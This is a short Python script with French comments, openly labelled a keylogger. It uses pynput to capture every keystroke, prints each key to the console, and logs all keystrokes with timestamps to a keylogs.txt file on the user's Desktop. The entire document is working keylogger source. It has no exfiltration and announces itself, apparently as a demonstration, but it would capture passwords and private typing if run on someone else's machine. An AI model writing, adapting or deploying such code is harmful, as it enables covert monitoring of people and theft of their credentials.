import logging
import os
import sys
import time

# On configure le fichier de log sur le Bureau
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
log_file = os.path.join(desktop, "keylogs.txt")

print(f"--- KEYLOGGER ACTIF ---")
print(f"[INFO] Fichier de sortie : {log_file}")
print(f"[INFO] En attente de frappes... (Tapez du texte !)")

# Configuration pour afficher dans la console ET écrire dans le fichier
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s: %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

def demarrer():
    # Importation à l'intérieur de la fonction pour éviter les erreurs si pynput manque au début
    from pynput import keyboard

    def on_press(key):
        try:
            k = str(key).replace("'", "")
            if key == keyboard.Key.space: k = " [ESPACE] "
            if key == keyboard.Key.enter: k = " [ENTREE]\n"
            
            print(f"Touche : {k}") # Preuve visuelle
            logging.info(k)        # Preuve stockée
        except Exception as e:
            print(f"Erreur: {e}")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    demarrer()
